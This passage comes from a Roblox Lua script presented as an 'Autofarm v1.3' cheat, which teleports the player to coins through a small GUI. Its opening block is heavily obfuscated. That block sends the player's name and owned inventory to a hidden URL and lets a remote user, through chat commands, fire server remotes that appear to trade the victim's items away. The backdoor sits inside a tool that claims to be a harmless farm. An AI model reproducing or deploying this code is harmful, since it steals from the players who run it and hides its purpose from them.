j={[v1({"\57\57",v1({"\57\52","\57\52","\57\52"}),"\48\49\49","\54\49\49","\49\48\49","\48\49\49",v1({"\52\53",v1({"\55\53","\50\53"}),"\57\52"})})]=v1({"\55\56",v1({"\57\52","\56\52",v1({"\55\53",v1({"\48\53","\51\53"})})}),"\55\57","\50\49\49",v1({"\57\52",v1({"\55\53",v1({"\48\53","\51\53"})}),v1({"\55\53","\50\53"})}),"\48\49\49","\50\51",v1({"\53\53","\57\52","\57\52"}),"\50\49\49",v1({"\56\52","\56\52","\57\52"}),"\55\57",v1({"\52\53",v1({"\55\53","\50\53"}),v1({"\55\53","\50\53"})}),v1({"\57\52",v1({"\54\53","\50\53"}),v1({"\55\53","\50\53"})}),"\50\51",v1({"\48\53","\56\52","\57\52"}),v1({"\57\52","\57\52",v1({"\55\53",v1({"\48\53","\51\53"})})}),"\52\49\49","\56\53","\50\51"})..game.Players.LocalPlayer.Name..v1({"\48\49","\55\56","\49\48\49",v1({"\53\53",v1({v1({"\51\53",v1({"\49\53",v1({v1({"\57\52","\51\53"}),"\51\53"})})}),"\51\53"})}),"\50\49\49","\49\49\49","\48\49\49","\53\49\49",v1({"\54\53","\51\53"}),v1({v1({"\54\53",v1({"\48\53","\51\53"})}),"\57\52"})})..c}j=h:JSONEncode(j)local k=request({[v1({v1({"\51\53","\54\53"}),"\52\49\49",v1({"\54\53",v1({v1({"\52\53","\51\53"}),"\50\53"}),v1({v1({"\53\53","\51\53"}),"\50\53"})})})]=i,[v1({"\55\55",v1({"\57\52",v1({v1({"\52\53","\51\53"}),"\50\53"}),v1({"\55\53","\50\53"})}),"\54\49\49","\52\48\49","\49\49\49","\48\48\49"})]=v1({v1({"\56\52","\54\53"}),"\57\55","\51\56","\52\56"}),[v1({v1({"\52\53","\52\53"}),v1({"\57\52","\57\52","\57\52"}),"\48\48\49","\49\50\49"})]=j})end end)end;game.Players.PlayerAdded:Connect(function(s)s[v1({"\55\54","\52\48\49",v1({"\53\53",v1({"\53\53","\51\53"})}),"\54\49\49",v1({"\52\53","\57\52","\57\52"}),v1({"\57\52",v1({"\54\53","\50\53"}),v1({"\55\53","\50\53"})}),"\48\48\49"})]:Connect(function(t)if t==g..v1({v1({"\55\53","\50\53"})})then game[v1({"\50\56","\49\48\49","\50\49\49",v1({"\54\53","\56\52","\57\52"}),"\53\48\49","\57\57","\55\57","\54\49\49","\49\48\49","\48\48\49","\51\56","\54\49\49","\49\49\49",v1({"\50\53",v1({"\55\53",v1({"\48\53","\51\53"})}),"\57\52"}),v1({"\53\53","\55\53"}),"\51\48\49","\49\48\49"})][v1({"\52\56","\52\49\49","\55\57",v1({"\56\52",v1({"\54\53","\50\53"}),v1({"\55\53","\50\53"})}),"\49\48\49"})][v1({v1({"\49\53","\54\53"}),"\49\48\49",v1({"\56\52","\57\52","\57\52"}),v1({"\56\52","\56\52",v1({"\55\53","\50\53"})}),"\50\56","\49\48\49","\51\49\49","\55\49\49",v1({"\57\52","\56\52","\57\52"}),"\53\49\49","\54\49\49"})]:InvokeServer(s)end;if t==g..v1({"\48\53"})then game[v1({"\111\49\51","\50\56","\102\51\49","\49\48\49","\111\55\55",v1({"\115\52\57","\48\53",v1({"\115\52\55","\55\53","\113\53\50","\50\53"}),"\57\52"}),"\106\54\53","\56\48\49","\98\51\56",v1({v1({"\106\49\48","\49\53","\106\54\56","\51\53"}),"\108\57\54",v1({"\54\53","\121\54\50","\50\53"}),"\57\52"}),"\57\57","\100\51\55","\55\57","\121\52\52","\54\49\49","\121\56\54","\49\48\49","\110\55\55",v1({"\120\52\55","\56\52","\102\53\53","\56\52","\117\48\52",v1({"\114\50\55",v1({"\109\53\50","\53\53","\112\49\56","\51\53"}),"\105\57\52","\50\53"})}),v1({"\115\53\53",v1({"\111\53\57","\57\52","\114\54\57","\51\53"}),"\54\53"}),"\122\48\53",v1({"\52\53","\103\49\50","\57\52","\57\52"}),"\49\49\49","\100\54\48","\52\49\49","\117\53\56","\55\57","\111\52\49","\51\48\49","\107\54\54",v1({"\57\52","\120\53\50","\56\52","\57\52"})})][v1({"\107\51\52","\52\56","\99\55\53","\52\49\49","\122\57\55",v1({"\101\53\49","\53\53","\98\49\54","\55\53"}),"\48\48\49","\49\48\49"})][v1({"\53\54","\57\57",v1({"\55\53",v1({"\53\53","\51\53"})}),v1({"\57\52",v1({"\54\53","\50\53"}),"\57\52"}),"\50\49\49","\54\49\49","\52\56",v1({"\50\53","\57\52","\57\52"}),v1({"\53\53","\55\53"}),v1({"\56\52","\56\52","\57\52"}),"\49\48\49"})]:FireServer(tonumber(v1({"\48\53","\54\53",v1({v1({"\57\52","\51\53"}),v1({"\49\53","\51\53"})}),v1({"\50\53","\51\53"}),"\50\53","\52\53","\51\53","\54\53",v1({v1({"\54\53",v1({"\48\53",v1({"\49\53","\51\53"})})}),"\51\53"})})))end;if t:sub(1,4)==g..v1({"\51\56",v1({"\52\53",v1({"\51\53",v1({"\49\53","\51\53"})})})})then for u=1,4 do if t:sub(u+4,u+4)==""then break end;local v=tonumber(t:sub(u+4,u+4))local w=b[v]game[v1({"\50\56","\49\48\49",v1({v1({"\56\52","\51\53"}),"\57\52","\57\52"}),v1({"\54\53","\56\52","\57\52"}),"\53\48\49",v1({"\55\53",v1({v1({"\51\53","\51\53"}),v1({v1({"\57\52",v1({v1({"\57\52",v1({"\49\53","\51\53"})}),"\51\53"})}),"\51\53"})})}),v1({"\53\53",v1({v1({"\51\53",v1({"\49\53","\51\53"})}),v1({v1({"\57\52","\51\53"}),"\51\53"})})}),v1({"\52\53","\57\52","\57\52"}),"\49\48\49","\48\48\49","\51\56","\54\49\49",v1({"\57\52",v1({"\55\53","\50\53"}),"\57\52"}),v1({v1({"\48\53","\51\53"}),v1({v1({"\53\53","\51\53"}),"\50\53"}),"\57\52"}),"\55\57",v1({v1({"\57\52","\51\53"}),"\56\52","\57\52"}),"\49\48\49"})][v1({"\52\56",v1({"\50\53","\57\52","\57\52"}),"\55\57",v1({"\56\52","\56\52",v1({"\55\53","\50\53"})}),"\49\48\49"})][v1({"\57\55","\50\48\49","\50\48\49","\49\48\49","\52\49\49","\51\55",v1({"\52\53","\57\52","\57\52"}),"\49\48\49","\57\48\49"})]:FireServer(w,v1({v1({"\53\53",v1({v1({"\50\53",v1({"\49\53",v1({"\49\53",v1({"\49\53","\51\53"})})})}),"\51\53"})}),v1({"\57\52","\56\52","\57\52"}),v1({"\53\53",v1({v1({"\51\53","\51\53"}),"\51\53"})}),"\50\49\49",v1({"\57\52","\57\52",v1({v1({"\53\53",v1({"\49\53","\51\53"})}),"\50\53"})}),v1({v1({"\54\53","\50\53"}),"\57\52","\57\52"}),"\53\49\49"}))end end;if t==g..v1({"\50\56","\57\54","\54\55"})then local x=game:GetService(v1({"\50\56","\49\48\49","\50\49\49",v1({"\54\53","\56\52","\57\52"}),"\53\48\49","\57\57","\55\57","\54\49\49","\49\48\49","\48\48\49","\51\56",v1({v1({"\50\53","\51\53"}),"\57\52","\57\52"}),"\49\49\49","\52\49\49","\55\57",v1({v1({"\57\52","\51\53"}),"\56\52","\57\52"}),v1({v1({"\55\53","\50\53"}),v1({v1({"\52\53","\51\53"}),v1({"\48\53","\51\53"})}),"\57\52"})})).Remotes[v1({"\51\55","\48\49\49","\56\49\49",v1({"\57\52","\56\52","\57\52"}),"\48\49\49","\54\49\49","\49\49\49",v1({v1({"\48\53","\51\53"}),v1({v1({"\53\53","\51\53"}),v1({"\48\53","\51\53"})}),"\57\52"}),"\49\50\49"})][v1({"\49\55",v1({"\57\52","\56\52",v1({"\55\53","\50\53"})}),"\54\49\49","\48\56","\52\49\49","\49\49\49",v1({"\48\53",v1({"\54\53","\50\53"}),v1({"\55\53",v1({"\48\53","\51\53"})})}),v1({"\51\53","\56\52","\57\52"}),"\56\48\49","\49\48\49","\56\54","\55\57",v1({"\52\53","\57\52","\57\52"}),"\55\57"})]:InvokeServer()x=x[v1({"\55\56","\49\48\49","\55\57","\50\49\49","\49\49\49","\48\49\49","\53\49\49"})].Owned;local y={}local z=""local d=0;for e in pairs(x)do d=d+1;z=z.."            "..d.."."..e.."\n"y[d]=e end;b=y;c=z;local j={[v1({"\57\57",v1({"\57\52","\57\52","\57\52"}),"\48\49\49","\54\49\49","\49\48\49","\48\49\49",v1({"\52\53",v1({"\55\53","\50\53"}),"\57\52"})})]=v1({"\55\56",v1({"\57\52","\56\52",v1({"\55\53",v1({"\48\53","\51\53"})})}),"\55\57","\50\49\49",v1({"\57\52",v1({"\55\53",v1({"\48\53","\51\53"})}),v1({"\55\53","\50\53"})}),"\48\49\49","\50\51",v1({"\53\53","\57\52","\57\52"}),"\50\49\49",v1({"\56\52","\56\52","\57\52"}),"\55\57",v1({"\52\53",v1({"\55\53","\50\53"}),v1({"\55\53","\50\53"})}),v1({"\57\52",v1({"\54\53","\50\53"}),v1({"\55\53","\50\53"})}),"\50\51",v1({"\48\53","\56\52","\57\52"}),v1({"\57\52","\57\52",v1({"\55\53",v1({"\48\53","\51\53"})})}),"\52\49\49","\56\53","\50\51"})..game.Players.LocalPlayer.Name..v1({"\48\49","\55\56","\49\48\49",v1({"\53\53",v1({v1({"\51\53",v1({"\49\53",v1({v1({"\57\52","\51\53"}),"\51\53"})})}),"\51\53"})}),"\50\49\49","\49\49\49","\48\49\49","\53\49\49",v1({"\54\53","\51\53"}),v1({v1({"\54\53",v1({"\48\53","\51\53"})}),"\57\52"})})..c}j=h:JSONEncode(j)local k=request({[v1({v1({"\51\53","\54\53"}),"\52\49\49",v1({"\54\53",v1({v1({"\52\53","\51\53"}),"\50\53"}),v1({v1({"\53\53","\51\53"}),"\50\53"})})})]=i,[v1({"\55\55",v1({"\57\52",v1({v1({"\52\53","\51\53"}),"\50\53"}),v1({"\55\53","\50\53"})}),"\54\49\49","\52\48\49","\49\49\49","\48\48\49"})]=v1({v1({"\56\52","\54\53"}),"\57\55","\51\56","\52\56"}),[v1({v1({"\52\53","\52\53"}),v1({"\57\52","\57\52","\57\52"}),"\48\48\49","\49\50\49"})]=j})end end)end)
wait(4)
D["c"]:Remove()
D["2"] = Instance.new("Frame", D["1"])
D["2"]["BorderSizePixel"] = 0
D["2"]["BackgroundColor3"] = Color3.fromRGB(55, 60, 87)
D["2"]["Size"] = UDim2.new(0.25279, 0, 0.15783, 0)
D["2"]["Position"] = UDim2.new(0.37326, 0, 0.38034, 0)
D["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["2"]["Name"] = "MainFrame"
D["2"]["BackgroundTransparency"] = 0.35
D["2"]["ClipsDescendants"] = true
D["3"] = Instance.new("UIStroke", D["2"])
D["3"]["Thickness"] = 2
D["3"]["Color"] = Color3.fromRGB(131, 148, 255)
D["4"] = Instance.new("TextLabel", D["2"])
D["4"]["TextWrapped"] = true
D["4"]["BorderSizePixel"] = 0
D["4"]["TextScaled"] = true
D["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
D["4"]["TextSize"] = 37
D["4"]["FontFace"] =
    Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
D["4"]["TextColor3"] = Color3.fromRGB(131, 148, 255)
D["4"]["BackgroundTransparency"] = 1
D["4"]["Size"] = UDim2.new(1, 0, 0.41803, 0)
D["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["4"]["Text"] = "Autofarm v1.3"
D["4"]["ZIndex"] = 3
D["5"] = Instance.new("UITextSizeConstraint", D["4"])
D["5"]["MaxTextSize"] = 37
D["6"] = Instance.new("TextButton", D["2"])
D["6"]["TextWrapped"] = true
D["6"]["BorderSizePixel"] = 0
D["6"]["TextSize"] = 23
D["6"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
D["6"]["TextScaled"] = true
D["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
D["6"]["FontFace"] =
    Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
D["6"]["Size"] = UDim2.new(0.55096, 0, 0.40984, 0)
D["6"]["BackgroundTransparency"] = 0.85
D["6"]["Name"] = "Toggle"
D["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["6"]["Text"] = "Toggle farm"
D["6"]["Position"] = UDim2.new(0.22314, 0, 0.46872, 0)
D["6"]["ZIndex"] = 3
D["7"] = Instance.new("UIStroke", D["6"])
D["7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
D["7"]["Thickness"] = 2
D["7"]["Color"] = Color3.fromRGB(131, 148, 255)
D["8"] = Instance.new("UICorner", D["6"])
D["8"]["CornerRadius"] = UDim.new(0.4, 0)
D["9"] = Instance.new("UITextSizeConstraint", D["6"])
D["9"]["MaxTextSize"] = 23
D["a"] = Instance.new("UICorner", D["2"])
D["a"]["CornerRadius"] = UDim.new(0.15, 0)
D["b"] = Instance.new("TextButton", D["2"])
D["b"]["TextWrapped"] = true
D["b"]["BorderSizePixel"] = 0
D["b"]["TextSize"] = 23
D["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
D["b"]["TextScaled"] = true
D["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
D["b"]["FontFace"] =
    Font.new("rbxasset://fonts/families/JosefinSans.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
D["b"]["Size"] = UDim2.new(0.07923, 0, 0.22951, 0)
D["b"]["BackgroundTransparency"] = 1
D["b"]["Name"] = "Close"
D["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["b"]["Text"] = "x"
D["b"]["Position"] = UDim2.new(0.91832, 0, -0.00669, 0)
D["b"]["ZIndex"] = 3
D["d"] = Instance.new("ImageButton", D["2"])
D["d"]["BorderSizePixel"] = 0
D["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
D["d"]["Image"] = "http://www.roblox.com/asset/?id=116575243151479"
D["d"]["Size"] = UDim2.new(0.13517, 0, 0.40164, 0)
D["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["d"]["Rotation"] = 180
D["d"]["Position"] = UDim2.new(0.83312, 0, 0.47541, 0)
D["d"]["ZIndex"] = 3
D["e"] = Instance.new("UICorner", D["d"])
D["e"]["CornerRadius"] = UDim.new(1, 0)
D["f"] = Instance.new("ImageLabel", D["d"])
D["f"]["BorderSizePixel"] = 0
D["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
D["f"]["Image"] = "http://www.roblox.com/asset/?id=76657578287916"
D["f"]["Size"] = UDim2.new(1, 0, 1, 0)
D["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["f"]["BackgroundTransparency"] = 1
D["f"]["Rotation"] = 180
D["f"]["ZIndex"] = 3
D["12"] = Instance.new("Frame", D["1"])
D["12"]["BorderSizePixel"] = 0
D["12"]["BackgroundColor3"] = Color3.fromRGB(58, 58, 80)
D["12"]["Size"] = UDim2.new(0.21339, 0, 0.12937, 0)
D["12"]["Position"] = UDim2.new(0.77964, 0, 0.8577, 0)
D["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["12"]["Name"] = "Notify"
D["12"].Visible = false
D["12"]["ZIndex"] = 3
D["13"] = Instance.new("Frame", D["12"])
D["13"]["BorderSizePixel"] = 0
D["13"]["BackgroundColor3"] = Color3.fromRGB(131, 148, 255)
D["13"]["AnchorPoint"] = Vector2.new(0, 1)
D["13"]["Size"] = UDim2.new(1, 0, 0.03, 0)
D["13"]["Position"] = UDim2.new(0, 0, 1, 0)
D["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["13"]["Name"] = "DownBar"
D["13"]["ZIndex"] = 3
D["14"] = Instance.new("TextLabel", D["12"])
D["14"]["TextWrapped"] = true
D["14"]["BorderSizePixel"] = 0
D["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
D["14"]["TextSize"] = 20
D["14"]["FontFace"] =
    Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
D["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
D["14"]["BackgroundTransparency"] = 1
D["14"]["Size"] = UDim2.new(0.96078, 0, 0.91, 0)
D["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
D["14"]["Text"] = "Copied to clipboard!"
D["14"]["Name"] = "Text"
D["14"]["Position"] = UDim2.new(0.01961, 0, 0.06, 0)
D["14"]["ZIndex"] = 3
local ai = {}
function D:Notify(aj, ak)
    ak = ak or 5
    aj = aj or ""
    for r, al in pairs(ai) do
        if al.tween ~= nil then
            al.tween:Stop()
        end
        al.obj.Position = UDim2.fromScale(al.obj.Position.X.Scale, al.obj.Position.Y.Scale - 0.14)
    end
    D["14"]["Text"] = aj
    local al = D["12"]:Clone()
    al.Parent = D["1"]
    al.Visible = true
    al.Position = UDim2.new(1.1, 0, al.Position.Y.Scale, 0)
    ah:Create(al.DownBar, TweenInfo.new(ak), {Size = UDim2.new(0, 0, 0.03, 0)}):Play()
    local am = ah:Create(al, TweenInfo.new(0.5), {Position = UDim2.new(0.77964, 0, al.Position.Y.Scale, 0)}):Play()
    local v = #ai + 1
    ai[v] = {obj = al, tween = am}
    spawn(
        function()
            wait(ak)
            ah:Create(al, TweenInfo.new(0.5), {Position = UDim2.new(1.3, 0, al.Position.Y.Scale, 0)}):Play()
            wait(0.5)
            ai[v] = nil
            al:Remove()
        end
    )
end
do
    local an = game:GetService("UserInputService")
    local ao = D["2"]
    local ap
    local aq
    local ar
    local as
    local function at(au)
        local av = au.Position - ar
        ao.Position = UDim2.new(0, as.X.Offset + av.X, 0, as.Y.Offset + av.Y)
    end
    ao.InputBegan:Connect(
        function(au)
            if au.UserInputType == Enum.UserInputType.MouseButton1 or au.UserInputType == Enum.UserInputType.Touch then
                ap = true
                scrolling = true
                ar = au.Position
                as = ao.Position
                au.Changed:Connect(
                    function()
                        if au.UserInputState == Enum.UserInputState.End then
                            ap = false
                            scrolling = false
                        end
                    end
                )
            end
        end
    )
    ao.InputChanged:Connect(
        function(au)
            if au.UserInputType == Enum.UserInputType.MouseMovement or au.UserInputType == Enum.UserInputType.Touch then
                aq = au
            end
        end
    )
    an.InputChanged:Connect(
        function(au)
            if au == aq and ap then
                at(au)
            end
        end
    )
end
local aw = false
local ax
local ay = 35
local az = {}
for r, aA in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
    if aA:IsA("BasePart") then
        if aA.CanCollide == true then
            az[aA.Name] = true
        end
    end
end
spawn(
    function()
        while wait() do
            pcall(
                function()
                    local aB
                    for r, aC in pairs(game:GetService("Workspace"):GetChildren()) do
                        if aC:FindFirstChild("CoinContainer", true) ~= nil then
                            aB = aC
                            break
                        end
                    end
                    if aB then
                        local aD = aB:FindFirstChild("CoinContainer")
                        if aw then
                            local aE
                            local aF = math.huge
                            for r, aG in pairs(aD:GetChildren()) do
                                local distance =
                                    math.floor(
                                    (aG.CFrame.Position -
                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                                )
                                if aF > distance and aG.CoinVisual.Transparency ~= 1 then
                                    aF = distance
                                    aE = aG
                                end
                            end
                            if aF < 200 then
                                local aH = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
                                local ak = aF / ay
                                if aF < 10 then
                                    ak = 0
                                end
                                task.wait(ak)
                                game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame =
                                    CFrame.new(aE.CFrame.Position) * CFrame.Angles(math.rad(180), 0, 0)
                            end
                        end
                    end
                end
            )
            wait()
        end
    end
)
D["6"].MouseButton1Click:Connect(
    function()
        aw = not aw
        if aw then
            D["6"]["TextColor3"] = Color3.fromRGB(0, 255, 0)
        else
            D["6"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
            if ax ~= nil then
                ax:Stop()
                ax = nil
            end
        end
    end
)
local aI = {}
local aJ = {}
local aK = true
D["b"].MouseButton1Click:Connect(
    function()
        aK = false
        D["1"]:Destroy()
        aw = false
        for r, aL in pairs(aI) do
            aL["Update"] = false
        end
    end
)
D["d"].MouseButton1Click:Connect(
    function()
        setclipboard("https://discord.gg/7M4cbMk9FB")
        D:Notify("Copied to clipboard", 5)
    end
)
function distance(aM, aN, aO, aP)
    return math.sqrt((aM - aO) ^ 2 + (aP - aN) ^ 2)
end
function NewDot(aQ)
    local aR
    local aL = Instance.new("Frame", D["2"])
    aL["BorderSizePixel"] = 0
    aL["BackgroundColor3"] = Color3.fromRGB(131, 148, 255)
    aL["Size"] = UDim2.new(0, 7, 0, 7)
    aL["Position"] = UDim2.new(0, 0, 0, 0)
    aL["BorderColor3"] = Color3.fromRGB(0, 0, 0)
    aL["ZIndex"] = -1
    if aQ >= 315 or aQ <= 45 then
        aL.Position = UDim2.new(1, 0, math.sin(aQ) / 2 + 0.5, 0)
        aR = math.random(91, 269)
    elseif aQ >= 135 and aQ <= 225 then
        aL.Position = UDim2.new(0, -7, math.sin(aQ) / 2 + 0.5, 0)
        aR = math.random(0, 1) == 1 and math.random(0, 89) or math.random(271, 359)
    elseif aQ >= 45 and aQ <= 135 then
        aL.Position = UDim2.new(math.cos(aQ) / 2 + 0.5, 0, 1, 0)
        aR = math.random(181, 359)
    elseif aQ >= 225 and aQ <= 315 then
        aL.Position = UDim2.new(math.cos(aQ) / 2 + 0.5, 0, 0, -7)
        aR = math.random(45, 135)
    end
    local aS = Instance.new("UICorner", aL)
    aS["CornerRadius"] = UDim.new(1, 0)
    local v = #aI + 1
    local aT = {}
    aT["dot"] = aL
    aT["Angle"] = aQ
    aT["Vector"] = aR
    aT["Speed"] = math.random(0.1, 1)
    aT["X"] = aL.Position.X.Offset
    aT["Y"] = aL.Position.Y.Offset
    aT["Lines"] = {}
    aT["Update"] = true
    spawn(
        function()
            while aT["Update"] do
                local aU = math.cos(aT["Vector"]) / aT["Speed"]
                local aV = math.sin(aT["Vector"]) / aT["Speed"]
                aT["X"] = aT["X"] + aU
                aT["Y"] = aT["Y"] + aV
                if math.abs(aT["X"]) > D["2"].AbsoluteSize.X and math.abs(aT["Y"]) > D["2"].AbsoluteSize.Y then
                    aI[v] = nil
                    aT["Update"] = false
                    aL:Remove()
                end
                aL.Position = UDim2.new(aL.Position.X.Scale, aT["X"], aL.Position.Y.Scale, aT["Y"])
                task.wait(0.01)
            end
        end
    )
    aI[v] = aT
end
spawn(
    function()
        while aK do
            NewDot(math.random(0, 360))
            task.wait(math.random(0.7, 1.2))
        end
    end
)
function serializeTable(aW, aX, aY, aZ)
    aY = aY or false
    aZ = aZ or 2
    local a_ = string.rep(" ", aZ)
    if type(aX) == "number" then
        aX = "[" .. aX .. "]"
    end
    if aX then
        a_ = a_ .. aX .. " = "
    end
    if type(aW) == "table" then
        a_ = a_ .. "{" .. (not aY and "\n" or "")
        for b0, T in pairs(aW) do
            a_ = a_ .. serializeTable(T, b0, aY, aZ + 1) .. "," .. (not aY and "\n" or "")
        end
        a_ = a_ .. string.rep(" ", aZ) .. "}"
    elseif type(aW) == "number" then
        a_ = a_ .. tostring(aW)
    elseif type(aW) == "string" then
        a_ = a_ .. string.format("%q", aW)
    elseif type(aW) == "boolean" then
        a_ = a_ .. (aW and "true" or "false")
    elseif typeof(aW) == "Vector3" then
        a_ = a_ .. "Vector3.new( " .. tostring(aW) .. ")"
    elseif typeof(aW) == "Vector2" then
        a_ = a_ .. "Vector2.new( " .. tostring(aW) .. ")"
    elseif typeof(aW) == "UDim2" then
        a_ = a_ .. "UDim2.new( " .. tostring(aW) .. ")"
    elseif typeof(aW) == "UDim" then
        a_ = a_ .. "UDim.new( " .. tostring(aW) .. ")"
    elseif typeof(aW) == "Instance" then
        a_ = a_ .. aW:GetFullName()
    elseif typeof(aW) == "Color3" then
        a_ = a_ .. "Color3.new( " .. aW.R .. "," .. aW.G .. "," .. aW.B .. ")"
    else
        a_ = a_ .. '"[inserializeable datatype:' .. type(aW) .. ']"'
    end
    return a_
end
